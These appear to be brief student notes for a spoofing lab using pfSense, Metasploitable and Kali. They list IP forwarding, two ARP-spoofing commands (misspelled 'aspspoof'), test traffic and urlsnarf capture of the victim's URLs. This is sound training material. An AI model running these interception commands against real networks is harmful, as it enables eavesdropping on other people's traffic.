# Notes of Lab 01 Spoof

- Run pfsense, metasploit, kali
- Login to meta (msfadmin / msfadmin)
- Kali -> nmap or netdiscover
- Kali -> echo 1 > /proc/sys/net/ipv4/ip_forward
- Kali -> aspspoof -i eth0 -t <vict-ip> <router-ip>
- Kali -> aspspoof -i eth0 -t <router-ip> <vict-ip>
- Meta -> wget http://google.es
- Kali -> urlsnarf


sudo bash -c 'echo 1 > /proc/sys/net/ipv4/ip_forward'

